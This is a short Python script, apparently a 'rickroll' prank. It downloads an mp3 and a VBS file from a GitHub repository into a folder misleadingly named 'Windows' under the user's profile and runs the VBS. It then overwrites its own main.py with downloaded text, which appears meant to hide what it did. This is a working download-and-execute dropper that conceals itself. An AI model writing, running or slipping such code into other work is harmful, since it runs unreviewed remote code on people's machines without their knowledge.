import os

os.system("mkdir %userprofile%\\Windows")
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/rickroll.mp3 -o %userprofile%\\Windows\\main.mp3"')
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/main.vbs -o %userprofile%\\Windows\\main.vbs"')
os.system('powershell "curl https://github.com/WilliamAfton-codes/SuperRickRoll/raw/main/replace.txt -o replace.txt"')
replacement = open('replace.txt')
rpl = replacement.readlines()
os.system('cd %userprofile%\\Windows && main.vbs')
with open ('main.py', 'w') as f:
    f.writelines(rpl)
